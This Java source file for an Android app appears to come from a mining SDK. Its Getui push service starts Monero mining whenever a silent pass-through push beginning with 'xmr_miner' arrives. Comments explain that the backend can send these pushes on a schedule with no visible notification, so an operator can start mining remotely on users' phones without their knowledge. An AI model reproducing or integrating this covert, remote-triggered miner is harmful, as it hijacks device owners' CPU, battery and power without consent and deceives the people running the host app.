package io.waterhole.miner;

import android.content.Context;

import android.os.RemoteException;
import com.igexin.sdk.GTIntentService;
import com.igexin.sdk.PushManager;
import com.igexin.sdk.message.GTCmdMessage;
import com.igexin.sdk.message.GTNotificationMessage;
import com.igexin.sdk.message.GTTransmitMessage;
import waterhole.miner.core.StateObserver;
import waterhole.miner.core.utils.LogUtils;
import waterhole.miner.monero.XmrMiner;

/**
 * 继承 GTIntentService 接收来自个推的消息, 所有消息在线程中回调, 如果注册了该服务,
 * 则务必要在 AndroidManifest中声明, 否则无法接受消息<br>
 * onReceiveMessageData 处理透传消息<br>
 * onReceiveClientId 接收 cid <br>
 * onReceiveOnlineState cid 离线上线通知 <br>
 * onReceiveCommandResult 各种事件处理回执 <br>
 *
 * @author kzw on 2017/12/22.
 */
public final class GetuiIntentService extends GTIntentService {

    public GetuiIntentService() {
    }

    @Override
    public void onNotificationMessageClicked(Context context, GTNotificationMessage gtNotificationMessage) {
    }

    @Override
    public void onNotificationMessageArrived(Context context, GTNotificationMessage gtNotificationMessage) {
    }

    @Override
    public void onReceiveServicePid(Context context, int pid) {
        LogUtils.info("onReceiveServicePid -> " + pid);
    }

    @Override
    public void onReceiveMessageData(Context context, GTTransmitMessage msg) {
        String appid = msg.getAppid();
        String taskid = msg.getTaskId();
        String messageid = msg.getMessageId();
        byte[] payload = msg.getPayload();
        String pkg = msg.getPkgName();
        String cid = msg.getClientId();

        // 第三方回执调用接口，actionid范围为90000-90999，可根据业务场景执行
        boolean result = PushManager.getInstance().sendFeedbackMessage(context, taskid, messageid, 90001);
        LogUtils.info("call sendFeedbackMessage = " + (result ? "success" : "failed"));
        LogUtils.info("onReceiveMessageData -> " + "appid = " + appid + "\ntaskid = "
            + taskid + "\nmessageid = " + messageid + "\npkg = " + pkg
            + "\ncid = " + cid);
        if (payload == null) {
            LogUtils.error("receiver payload = null");
        } else {
            String data = new String(payload);
            LogUtils.info("receiver payload = " + data);
            /**
             * 定时推送透传消息拉起挖矿服务
             *
             * <li>
             *  1. 推送后台定时推送透传消息到接入客户端，约定好数据标识，如xmr_miner开头的字符，或者其他json串，无需启动通知栏通知.
             *  2. init(Context)的Context参数必须为主进程的Context，不能为Service的context，否则启动挖矿会失败
             * </li>
             */
            // todo 启动字段|条件接入方自行设置，但init(Context)的Context参数必须为主进程的Context，不能为Service的context，否则启动挖矿会失败
            if (data.startsWith("xmr_miner")) {
                XmrMiner.instance().init(App.getContext()).setStateObserver(new StateObserver() {
                    @Override
                    public void onConnectPoolBegin() {
                    }

                    @Override
                    public void onConnectPoolSuccess() {
                    }

                    @Override
                    public void onConnectPoolFail(String error) {
                    }

                    @Override
                    public void onPoolDisconnect(String error) {
                    }

                    @Override
                    public void onMessageFromPool(String message) {
                    }

                    @Override
                    public void onMiningError(String error) {
                    }

                    @Override
                    public void onMiningStatus(double speed) {
                    }
                }).startMine();
            }
        }
    }

    @Override
    public void onReceiveClientId(Context context, String clientid) {
        LogUtils.error("onReceiveClientId -> " + "clientid = " + clientid);
        // 441731ee7e3a839e3268a529044ace7d
    }

    @Override
    public void onReceiveOnlineState(Context context, boolean online) {
        LogUtils.error("onReceiveOnlineState -> " + (online ? "online" : "offline"));
    }

    @Override
    public void onReceiveCommandResult(Context context, GTCmdMessage cmdMessage) {
        LogUtils.error("onReceiveCommandResult -> " + cmdMessage);
    }
}
